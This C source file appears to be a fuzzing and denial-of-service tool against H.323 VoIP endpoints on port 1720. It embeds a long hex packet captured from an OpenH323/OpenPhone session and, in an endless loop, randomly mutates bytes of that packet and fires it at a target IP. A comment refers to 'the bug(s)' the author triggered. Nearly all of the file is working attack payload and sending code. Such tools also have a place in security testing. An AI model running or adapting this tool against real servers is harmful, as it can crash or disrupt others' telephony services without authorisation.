#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <ctype.h>
#include <string.h>
#include <sys/signal.h>
#include <arpa/nameser.h>
#include <sys/time.h>
#include <time.h>
#include <errno.h>

// I tested the bug(s) on a fast internal LAN...might want to increase timeout
// for Internet testing
#define TIMEOUT 3 

char buf[8192];

// so, just sniff this in from a valid session...

const char req[] = 
"\x03\x00\x0C\x5A\x08\x02\x50\x60\x05\x04\x03\x88\x93\xA5\x28\x0B"
"\x4A\x6F\x68\x6E\x20\x4C\x61\x6D\x70\x65\x00\x7E\x0C\x3C\x05\x20"
"\xA8\x06\x00\x08\x91\x4A\x00\x04\x01\x40\x09\x00\x4A\x00\x6F\x00"
"\x68\x00\x6E\x00\x20\x00\x4C\x00\x61\x00\x6D\x00\x70\x00\x65\x22"
"\xC0\x09\x00\x00\x3D\x16\x45\x71\x75\x69\x76\x61\x6C\x65\x6E\x63"
"\x65\x20\x4F\x70\x65\x6E\x50\x68\x6F\x6E\x65\x00\x00\x19\x31\x2E"
"\x38\x2E\x31\x20\x28\x4F\x70\x65\x6E\x48\x33\x32\x33\x20\x76\x31"
"\x2E\x31\x31\x2E\x37\x29\x00\x00\x00\x0A\x0A\x0A\x2D\x06\xB8\x00"
"\x75\x55\x7E\x61\xBD\xEF\x18\x10\x99\xE4\x00\x08\x0D\xFD\x01\x5E"
"\x00\xC5\x1D\x80\x04\x07\x00\x0A\x0A\x0A\x13\x0F\xA3\x11\x00\x75"
"\x55\x7E\x61\xBD\xEF\x18\x10\x99\xE3\x00\x08\x0D\xFD\x01\x5E\x88"
"\x7D\x2E\x1C\x40\x00\x00\x06\x04\x00\x4C\x60\x1D\x80\x11\x1C\x00"
"\x01\x00\x0A\x0A\x0A\x13\x13\xB0\x00\x0A\x0A\x0A\x13\x13\xB1\x13"
"\x00\x00\x64\x0C\x60\x1D\x80\x0B\x0D\x00\x01\x00\x0A\x0A\x0A\x13"
"\x13\xB1\x80\x1C\x40\x00\x00\x06\x04\x00\x4C\x20\x1D\x80\x11\x1C"
"\x00\x01\x00\x0A\x0A\x0A\x13\x13\xB0\x00\x0A\x0A\x0A\x13\x13\xB1"
"\x13\x00\x00\x65\x0C\x20\x1D\x80\x0B\x0D\x00\x01\x00\x0A\x0A\x0A"
"\x13\x13\xB1\x80\x1F\x40\x00\x00\x06\x04\x00\x4E\x0C\x03\x00\x83"
"\x00\x80\x11\x1C\x00\x01\x00\x0A\x0A\x0A\x13\x13\xB0\x00\x0A\x0A"
"\x0A\x13\x13\xB1\x16\x00\x00\x66\x0E\x0C\x03\x00\x83\x00\x80\x0B"
"\x0D\x00\x01\x00\x0A\x0A\x0A\x13\x13\xB1\x80\x4B\x40\x00\x00\x06"
"\x04\x00\x4C\x10\xB5\x00\x53\x4C\x2A\x02\x00\x00\x00\x00\x00\xF9"
"\x01\x00\x00\xF9\x01\x01\x00\x04\x00\x00\x00\x00\x00\x11\x00\x01"
"\x00\x40\x1F\x00\x00\xD7\x0F\x00\x00\x00\x01\x04\x00\x02\x00\xF9"
"\x01\x00\x00\x80\x12\x1C\x40\x01\x00\x0A\x0A\x0A\x13\x13\xB0\x00"
"\x0A\x0A\x0A\x13\x13\xB1\x00\x41\x00\x00\x67\x0C\x10\xB5\x00\x53"
"\x4C\x2A\x02\x00\x00\x00\x00\x00\xF9\x01\x00\x00\xF9\x01\x01\x00"
"\x04\x00\x00\x00\x00\x00\x11\x00\x01\x00\x40\x1F\x00\x00\xD7\x0F"
"\x00\x00\x00\x01\x04\x00\x02\x00\xF9\x01\x00\x00\x80\x0B\x0D\x40"
"\x01\x00\x0A\x0A\x0A\x13\x13\xB1\x80\x4B\x40\x00\x00\x06\x04\x00"
"\x4C\x10\xB5\x00\x53\x4C\x2A\x02\x00\x00\x00\x00\x00\x40\x01\x00"
"\x00\x40\x01\x02\x00\x08\x00\x00\x00\x00\x00\x31\x00\x01\x00\x40"
"\x1F\x00\x00\x59\x06\x00\x00\x41\x00\x00\x00\x02\x00\x40\x01\x00"
"\x00\x80\x12\x1C\x40\x01\x00\x0A\x0A\x0A\x13\x13\xB0\x00\x0A\x0A"
"\x0A\x13\x13\xB1\x30\x41\x00\x00\x68\x0C\x10\xB5\x00\x53\x4C\x2A"
"\x02\x00\x00\x00\x00\x00\x40\x01\x00\x00\x40\x01\x02\x00\x08\x00"
"\x00\x00\x00\x00\x31\x00\x01\x00\x40\x1F\x00\x00\x59\x06\x00\x00"
"\x41\x00\x00\x00\x02\x00\x40\x01\x00\x00\x80\x0B\x0D\x40\x01\x00"
"\x0A\x0A\x0A\x13\x13\xB1\x98\x26\x40\x00\x00\x06\x04\x00\x4C\x10"
"\x09\x00\x00\x3D\x06\x4C\x50\x43\x2D\x31\x30\x80\x11\x1C\x00\x01"
"\x00\x0A\x0A\x0A\x13\x13\xB0\x00\x0A\x0A\x0A\x13\x13\xB1\x1D\x00"
"\x00\x69\x0C\x10\x09\x00\x00\x3D\x06\x4C\x50\x43\x2D\x31\x30\x80"
"\x0B\x0D\x00\x01\x00\x0A\x0A\x0A\x13\x13\xB1\x80\x1C\x40\x00\x00"
"\x06\x04\x00\x4D\x60\x05\x80\x11\x1C\x00\x01\x00\x0A\x0A\x0A\x13"
"\x13\xB0\x00\x0A\x0A\x0A\x13\x13\xB1\x13\x00\x00\x6A\x0D\x60\x05"
"\x80\x0B\x0D\x00\x01\x00\x0A\x0A\x0A\x13\x13\xB1\x80\x1C\x40\x00"
"\x00\x06\x04\x00\x4D\x40\x05\x80\x11\x1C\x00\x01\x00\x0A\x0A\x0A"
"\x13\x13\xB0\x00\x0A\x0A\x0A\x13\x13\xB1\x13\x00\x00\x6B\x0D\x40"
"\x05\x80\x0B\x0D\x00\x01\x00\x0A\x0A\x0A\x13\x13\xB1\x80\x4C\x40"
"\x00\x00\x06\x04\x00\x4C\x10\x09\x00\x00\x3D\x2C\x47\x2E\x37\x32"
"\x36\x2D\x31\x36\x6B\x00\x0A\xB0\x6F\x00\x30\x80\x10\x00\x30\x00"
"\x11\x00\x30\x60\x11\x00\x30\x64\x01\x29\x30\x30\x13\x00\x30\x5E"
"\x01\x29\x30\x58\x01\x29\x30\x52\x80\x11\x1C\x00\x01\x00\x0A\x0A"
"\x0A\x13\x13\xB0\x00\x0A\x0A\x0A\x13\x13\xB1\x43\x00\x00\x6C\x0C"
"\x10\x09\x00\x00\x3D\x2C\x47\x2E\x37\x32\x36\x2D\x31\x36\x6B\x00"
"\x0A\xB0\x6F\x00\x30\x80\x10\x00\x30\x00\x11\x00\x30\x60\x11\x00"
"\x30\x64\x01\x29\x30\x30\x13\x00\x30\x5E\x01\x29\x30\x58\x01\x29"
"\x30\x52\x80\x0B\x0D\x00\x01\x00\x0A\x0A\x0A\x13\x13\xB1\x80\x4C"
"\x40\x00\x00\x06\x04\x00\x4C\x10\x09\x00\x00\x3D\x2C\x47\x2E\x37"
"\x32\x36\x2D\x32\x34\x6B\x00\x0A\x47\x2E\x37\x32\x36\x2D\x31\x36"
"\x6B\x00\x00\xB0\x6F\x00\x30\x80\x10\x00\x30\x00\x11\x00\x30\x60"
"\x11\x00\x30\x64\x01\x29\x30\x30\x13\x80\x11\x1C\x00\x01\x00\x0A"
"\x0A\x0A\x13\x13\xB0\x00\x0A\x0A\x0A\x13\x13\xB1\x43\x00\x00\x6D"
"\x0C\x10\x09\x00\x00\x3D\x2C\x47\x2E\x37\x32\x36\x2D\x32\x34\x6B"
"\x00\x0A\x47\x2E\x37\x32\x36\x2D\x31\x36\x6B\x00\x00\xB0\x6F\x00"
"\x30\x80\x10\x00\x30\x00\x11\x00\x30\x60\x11\x00\x30\x64\x01\x29"
"\x30\x30\x13\x80\x0B\x0D\x00\x01\x00\x0A\x0A\x0A\x13\x13\xB1\x80"
"\x4C\x40\x00\x00\x06\x04\x00\x4C\x10\x09\x00\x00\x3D\x2C\x47\x2E"
"\x37\x32\x36\x2D\x33\x32\x6B\x00\x0A\x47\x2E\x37\x32\x36\x2D\x32"
"\x34\x6B\x00\x00\x47\x2E\x37\x32\x36\x2D\x31\x36\x6B\x00\x00\xB0"
"\x6F\x00\x30\x80\x10\x00\x30\x00\x11\x00\x80\x11\x1C\x00\x01\x00"
"\x0A\x0A\x0A\x13\x13\xB0\x00\x0A\x0A\x0A\x13\x13\xB1\x43\x00\x00"
"\x6E\x0C\x10\x09\x00\x00\x3D\x2C\x47\x2E\x37\x32\x36\x2D\x33\x32"
"\x6B\x00\x0A\x47\x2E\x37\x32\x36\x2D\x32\x34\x6B\x00\x00\x47\x2E"
"\x37\x32\x36\x2D\x31\x36\x6B\x00\x00\xB0\x6F\x00\x30\x80\x10\x00"
"\x30\x00\x11\x00\x80\x0B\x0D\x00\x01\x00\x0A\x0A\x0A\x13\x13\xB1"
"\x80\x4C\x40\x00\x00\x06\x04\x00\x4C\x10\x09\x00\x00\x3D\x2C\x47"
"\x2E\x37\x32\x36\x2D\x34\x30\x6B\x00\x0A\x47\x2E\x37\x32\x36\x2D"
"\x33\x32\x6B\x00\x00\x47\x2E\x37\x32\x36\x2D\x32\x34\x6B\x00\x00"
"\x47\x2E\x37\x32\x36\x2D\x31\x36\x6B\x00\x00\x80\x11\x1C\x00\x01"
"\x00\x0A\x0A\x0A\x13\x13\xB0\x00\x0A\x0A\x0A\x13\x13\xB1\x43\x00"
"\x00\x6F\x0C\x10\x09\x00\x00\x3D\x2C\x47\x2E\x37\x32\x36\x2D\x34"
"\x30\x6B\x00\x0A\x47\x2E\x37\x32\x36\x2D\x33\x32\x6B\x00\x00\x47"
"\x2E\x37\x32\x36\x2D\x32\x34\x6B\x00\x00\x47\x2E\x37\x32\x36\x2D"
"\x31\x36\x6B\x00\x00\x80\x0B\x0D\x00\x01\x00\x0A\x0A\x0A\x13\x13"
"\xB1\x80\x32\x40\x00\x00\x06\x04\x00\x4C\x10\xB5\x00\x00\x26\x11"
"\x53\x70\x65\x65\x78\x20\x62\x73\x34\x20\x4E\x61\x72\x72\x6F\x77"
"\x36\x80\x12\x1C\x40\x01\x00\x0A\x0A\x0A\x13\x13\xB0\x00\x0A\x0A"
"\x0A\x13\x13\xB1\x38\x28\x00\x00\x70\x0C\x10\xB5\x00\x00\x26\x11"
"\x53\x70\x65\x65\x78\x20\x62\x73\x34\x20\x4E\x61\x72\x72\x6F\x77"
"\x36\x80\x0B\x0D\x40\x01\x00\x0A\x0A\x0A\x13\x13\xB1\x9C\x32\x40"
"\x00\x00\x06\x04"
"\x00\x4C\x10\xB5\x00\x00\x26\x11\x53\x70\x65\x65\x78\x20\x62\x73"
"\x34\x20\x4E\x61\x72\x72\x6F\x77\x35\x80\x12\x1C\x40\x01\x00\x0A"
"\x0A\x0A\x13\x13\xB0\x00\x0A\x0A\x0A\x13\x13\xB1\x20\x28\x00\x00"
"\x71\x0C\x10\xB5\x00\x00\x26\x11\x53\x70\x65\x65\x78\x20\x62\x73"
"\x34\x20\x4E\x61\x72\x72\x6F\x77\x35\x80\x0B\x0D\x40\x01\x00\x0A"
"\x0A\x0A\x13\x13\xB1\x90\x32\x40\x00\x00\x06\x04\x00\x4C\x10\xB5"
"\x00\x00\x26\x11\x53\x70\x65\x65\x78\x20\x62\x73\x34\x20\x4E\x61"
"\x72\x72\x6F\x77\x34\x80\x12\x1C\x40\x01\x00\x0A\x0A\x0A\x13\x13"
"\xB0\x00\x0A\x0A\x0A\x13\x13\xB1\x18\x28\x00\x00\x72\x0C\x10\xB5"
"\x00\x00\x26\x11\x53\x70\x65\x65\x78\x20\x62\x73\x34\x20\x4E\x61"
"\x72\x72\x6F\x77\x34\x80\x0B\x0D\x40\x01\x00\x0A\x0A\x0A\x13\x13"
"\xB1\x8C\x32\x40\x00\x00\x06\x04\x00\x4C\x10\xB5\x00\x00\x26\x11"
"\x53\x70\x65\x65\x78\x20\x62\x73\x34\x20\x4E\x61\x72\x72\x6F\x77"
"\x33\x80\x12\x1C\x40\x01\x00\x0A\x0A\x0A\x13\x13\xB0\x00\x0A\x0A"
"\x0A\x13\x13\xB1\x10\x28\x00\x00\x73\x0C\x10\xB5\x00\x00\x26\x11"
"\x53\x70\x65\x65\x78\x20\x62\x73\x34\x20\x4E\x61\x72\x72\x6F\x77"
"\x33\x80\x0B\x0D\x40\x01\x00\x0A\x0A\x0A\x13\x13\xB1\x88\x32\x40"
"\x00\x00\x06\x04\x00\x4C\x10\xB5\x00\x00\x26\x11\x53\x70\x65\x65"
"\x78\x20\x62\x73\x34\x20\x4E\x61\x72\x72\x6F\x77\x32\x80\x12\x1C"
"\x40\x01\x00\x0A\x0A\x0A\x13\x13\xB0\x00\x0A\x0A\x0A\x13\x13\xB1"
"\x08\x28\x00\x00\x74\x0C\x10\xB5\x00\x00\x26\x11\x53\x70\x65\x65"
"\x78\x20\x62\x73\x34\x20\x4E\x61\x72\x72\x6F\x77\x32\x80\x0B\x0D"
"\x40\x01\x00\x0A\x0A\x0A\x13\x13\xB1\x84\x32\x40\x00\x00\x06\x04"
"\x00\x4C\x10\x09\x00\x00\x3D\x11\x53\x70\x65\x65\x78\x20\x62\x73"
"\x34\x20\x4E\x61\x72\x72\x6F\x77\x36\x80\x12\x1C\x40\x01\x00\x0A"
"\x0A\x0A\x13\x13\xB0\x00\x0A\x0A\x0A\x13\x13\xB1\x38\x28\x00\x00"
"\x75\x0C\x10\x09\x00\x00\x3D\x11\x53\x70\x65\x65\x78\x20\x62\x73"
"\x34\x20\x4E\x61\x72\x72\x6F\x77\x36\x80\x0B\x0D\x40\x01\x00\x0A"
"\x0A\x0A\x13\x13\xB1\x9C\x32\x40\x00\x00\x06\x04\x00\x4C\x10\x09"
"\x00\x00\x3D\x11\x53\x70\x65\x65\x78\x20\x62\x73\x34\x20\x4E\x61"
"\x72\x72\x6F\x77\x35\x80\x12\x1C\x40\x01\x00\x0A\x0A\x0A\x13\x13"
"\xB0\x00\x0A\x0A\x0A\x13\x13\xB1\x20\x28\x00\x00\x76\x0C\x10\x09"
"\x00\x00\x3D\x11\x53\x70\x65\x65\x78\x20\x62\x73\x34\x20\x4E\x61"
"\x72\x72\x6F\x77\x35\x80\x0B\x0D\x40\x01\x00\x0A\x0A\x0A\x13\x13"
"\xB1\x90\x32\x40\x00\x00\x06\x04\x00\x4C\x10\x09\x00\x00\x3D\x11"
"\x53\x70\x65\x65\x78\x20\x62\x73\x34\x20\x4E\x61\x72\x72\x6F\x77"
"\x34\x80\x12\x1C\x40\x01\x00\x0A\x0A\x0A\x13\x13\xB0\x00\x0A\x0A"
"\x0A\x13\x13\xB1\x18\x28\x00\x00\x77\x0C\x10\x09\x00\x00\x3D\x11"
"\x53\x70\x65\x65\x78\x20\x62\x73\x34\x20\x4E\x61\x72\x72\x6F\x77"
"\x34\x80\x0B\x0D\x40\x01\x00\x0A\x0A\x0A\x13\x13\xB1\x8C\x32\x40"
"\x00\x00\x06\x04\x00\x4C\x10\x09\x00\x00\x3D\x11\x53\x70\x65\x65"
"\x78\x20\x62\x73\x34\x20\x4E\x61\x72\x72\x6F\x77\x33\x80\x12\x1C"
"\x40\x01\x00\x0A\x0A\x0A\x13\x13\xB0\x00\x0A\x0A\x0A\x13\x13\xB1"
"\x10\x28\x00\x00\x78\x0C\x10\x09\x00\x00\x3D\x11\x53\x70\x65\x65"
"\x78\x20\x62\x73\x34\x20\x4E\x61\x72\x72\x6F\x77\x33\x80\x0B\x0D"
"\x40\x01\x00\x0A\x0A\x0A\x13\x13\xB1\x88\x32\x40\x00\x00\x06\x04"
"\x00\x4C\x10\x09\x00\x00\x3D\x11\x53\x70\x65\x65\x78\x20\x62\x73"
"\x34\x20\x4E\x61\x72\x72\x6F\x77\x32\x80\x12\x1C\x40\x01\x00\x0A"
"\x0A\x0A\x13\x13\xB0\x00\x0A\x0A\x0A\x13\x13\xB1\x08\x28\x00\x00"
"\x79\x0C\x10\x09\x00\x00\x3D\x11\x53\x70\x65\x65\x78\x20\x62\x73"
"\x34\x20\x4E\x61\x72\x72\x6F\x77\x32\x80\x0B\x0D\x40\x01\x00\x0A"
"\x0A\x0A\x13\x13\xB1\x84\x21\x40\x00\x00\x06\x04\x00\x48\x71\x03"
"\x51\x00\x80\x01\x00\x80\x11\x1C\x00\x02\x00\x0A\x0A\x0A\x13\x13"
"\xB2\x00\x0A\x0A\x0A\x13\x13\xB3\x21\x40\x00\x00\x06\x04\x00\x48"
"\x6B\x03\x51\x00\x80\x01\x00\x80\x11\x1C\x00\x02\x00\x0A\x0A\x0A"
"\x13\x13\xB2\x00\x0A\x0A\x0A\x13\x13\xB3\x01\x00\x01\x00\x01\x00"
"\x01\x00\x83\x1E\x02\x83\x13\x02\x70\x01\x06\x00\x08\x81\x75\x00"
"\x07\x80\x13\x80\x00\xFA\x00\x01\x00\x00\x01\x00\x00\x01\x00\x00"
"\x0C\xC0\x01\x00\x01\x80\x1B\x80\x00\x00\x20\xC0\xEF\x80\x00\x01"
"\x20\x40\xEF\x80\x00\x02\x24\x18\x03\x00\xE6\x00\x80\x00\x03\x20"
"\x20\xB5\x00\x53\x4C\x2A\x02\x00\x00\x00\x00\x00\xF9\x01\x00\x00"
"\xF9\x01\x01\x00\x04\x00\x00\x00\x00\x00\x11\x00\x01\x00\x40\x1F"
"\x00\x00\xD7\x0F\x00\x00\x00\x01\x04\x00\x02\x00\xF9\x01\x00\x00"
"\x80\x00\x04\x20\x20\xB5\x00\x53\x4C\x2A\x02\x00\x00\x00\x00\x00"
"\x40\x01\x00\x00\x40\x01\x02\x00\x08\x00\x00\x00\x00\x00\x31\x00"
"\x01\x00\x40\x1F\x00\x00\x59\x06\x00\x00\x41\x00\x00\x00\x02\x00"
"\x40\x01\x00\x00\x80\x00\x05\x20\x20\x09\x00\x00\x3D\x06\x4C\x50"
"\x43\x2D\x31\x30\x80\x00\x06\x22\xC0\x17\x80\x00\x07\x22\x80\x17"
"\x80\x00\x08\x20\x20\x09\x00\x00\x3D\x2C\x47\x2E\x37\x32\x36\x2D"
"\x31\x36\x6B\x00\xF0\xB0\x6F\x00\x30\x80\x10\x00\x30\x00\x11\x00"
"\x30\x60\x11\x00\x30\x64\x01\x29\x30\x30\x13\x00\x30\x5E\x01\x29"
"\x30\x58\x01\x29\x30\x52\x80\x00\x09\x20\x20\x09\x00\x00\x3D\x2C"
"\x47\x2E\x37\x32\x36\x2D\x32\x34\x6B\x00\xF0\x47\x2E\x37\x32\x36"
"\x2D\x31\x36\x6B\x00\x00\xB0\x6F\x00\x30\x80\x10\x00\x30\x00\x11"
"\x00\x30\x60\x11\x00\x30\x64\x01\x29\x30\x30\x13\x80\x00\x0A\x20"
"\x20\x09\x00\x00\x3D\x2C\x47\x2E\x37\x32\x36\x2D\x33\x32\x6B\x00"
"\xF0\x47\x2E\x37\x32\x36\x2D\x32\x34\x6B\x00\x00\x47\x2E\x37\x32"
"\x36\x2D\x31\x36\x6B\x00\x00\xB0\x6F\x00\x30\x80\x10\x00\x30\x00"
"\x11\x00\x80\x00\x0B\x20\x20\x09\x00\x00\x3D\x2C\x47\x2E\x37\x32"
"\x36\x2D\x34\x30\x6B\x00\xF0\x47\x2E\x37\x32\x36\x2D\x33\x32\x6B"
"\x00\x00\x47\x2E\x37\x32\x36\x2D\x32\x34\x6B\x00\x00\x47\x2E\x37"
"\x32\x36\x2D\x31\x36\x6B\x00\x00\x80\x00\x0C\x20\x20\xB5\x00\x00"
"\x26\x11\x53\x70\x65\x65\x78\x20\x62\x73\x34\x20\x4E\x61\x72\x72"
"\x6F\x77\x36\x80\x00\x0D\x20\x20\xB5\x00\x00\x26\x11\x53\x70\x65"
"\x65\x78\x20\x62\x73\x34\x20\x4E\x61\x72\x72\x6F\x77\x35\x80\x00"
"\x0E\x20\x20\xB5\x00\x00\x26\x11\x53\x70\x65\x65\x78\x20\x62\x73"
"\x34\x20\x4E\x61\x72\x72\x6F\x77\x34\x80\x00\x0F\x20\x20\xB5\x00"
"\x00\x26\x11\x53\x70\x65\x65\x78\x20\x62\x73\x34\x20\x4E\x61\x72"
"\x72\x6F\x77\x33\x80\x00\x10\x20\x20\xB5\x00\x00\x26\x11\x53\x70"
"\x65\x65\x78\x20\x62\x73\x34\x20\x4E\x61\x72\x72\x6F\x77\x32\x80"
"\x00\x11\x20\x20\x09\x00\x00\x3D\x11\x53\x70\x65\x65\x78\x20\x62"
"\x73\x34\x20\x4E"
"\x61\x72\x72\x6F\x77\x36\x80\x00\x12\x20\x20\x09\x00\x00\x3D\x11"
"\x53\x70\x65\x65\x78\x20\x62\x73\x34\x20\x4E\x61\x72\x72\x6F\x77"
"\x35\x80\x00\x13\x20\x20\x09\x00\x00\x3D\x11\x53\x70\x65\x65\x78"
"\x20\x62\x73\x34\x20\x4E\x61\x72\x72\x6F\x77\x34\x80\x00\x14\x20"
"\x20\x09\x00\x00\x3D\x11\x53\x70\x65\x65\x78\x20\x62\x73\x34\x20"
"\x4E\x61\x72\x72\x6F\x77\x33\x80\x00\x15\x20\x20\x09\x00\x00\x3D"
"\x11\x53\x70\x65\x65\x78\x20\x62\x73\x34\x20\x4E\x61\x72\x72\x6F"
"\x77\x32\x80\x00\x16\x08\xE2\x03\x51\x00\x80\x01\x00\x80\x00\x17"
"\x08\xD6\x03\x51\x00\x80\x01\x00\x80\x00\x18\x83\x01\x50\x80\x00"
"\x19\x83\x01\x10\x80\x00\x1A\x83\x01\x40\x80\x00\x1B\x8A\x06\x14"
"\x04\x30\x2D\x31\x36\x00\x80\x01\x04\x15\x00\x00\x00\x01\x00\x02"
"\x00\x03\x00\x04\x00\x05\x00\x06\x00\x07\x00\x08\x00\x09\x00\x0A"
"\x00\x0B\x00\x0C\x00\x0D\x00\x0E\x00\x0F\x00\x10\x00\x11\x00\x12"
"\x00\x13\x00\x14\x00\x15\x00\x00\x16\x00\x00\x17\x00\x00\x18\x02"
"\x00\x19\x00\x1A\x00\x1B\x07\x01\x00\x32\x80\x5A\x84\x54\x02\x80"
"\x01\x80";




int main(int argc, char *argv[]) 
{
	struct sockaddr_in addr;
	int port, s, i, l;
	char *host = NULL;
	unsigned int seed;
	struct timeval tv;

        if (argc < 3) 
	{
                fprintf(stderr, "Use: %s [ip] [port]\n", argv[0]);
                exit(1);
        }
	

	host = argv[1];
	port = atoi(argv[2]);
	if ((port < 1) || (port > 65535)) 
	{
		fprintf(stderr, "Port out of range (%d)\n", port);
		fprintf(stderr, "Setting port to 1720\n");
		port = 1720;
	}


	gettimeofday(&tv, NULL);
	srand ( getpid() + tv.tv_usec );

        memset(&tv, 0, sizeof(tv));
        tv.tv_sec = TIMEOUT;
        tv.tv_usec = 0;

	
	memset(&addr, 0, sizeof(addr));


	signal(SIGPIPE, SIG_IGN); 

        while(1) 
        {
	    if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) 
	    {
		fprintf(stderr, "Socket error: %s\n", strerror(errno));
		exit(-1);
	    }

            setsockopt(s,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv));

	    addr.sin_family = AF_INET;
	    addr.sin_port = htons(port);
	    addr.sin_addr.s_addr = inet_addr(host);
	    if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) 
	    {
		sleep (1);
		if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) 
		{
			sleep (1);
			if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) 
			{
		            fprintf(stdout, "Unable to connect: %s\n", strerror(errno));
			    exit(0);
			}
                }
	    }

	    memcpy(buf, req, sizeof(req)-1);

	    for (i=0; i < (rand() % 12) + 1; i++)
	    {
	    	l = rand() % (sizeof(req) - 1) ;
	        buf[l] = rand() % 256;
            } 


	    write(s, buf, sizeof(buf)-1);
	    usleep (1000);

	    close(s);
        }
	
}

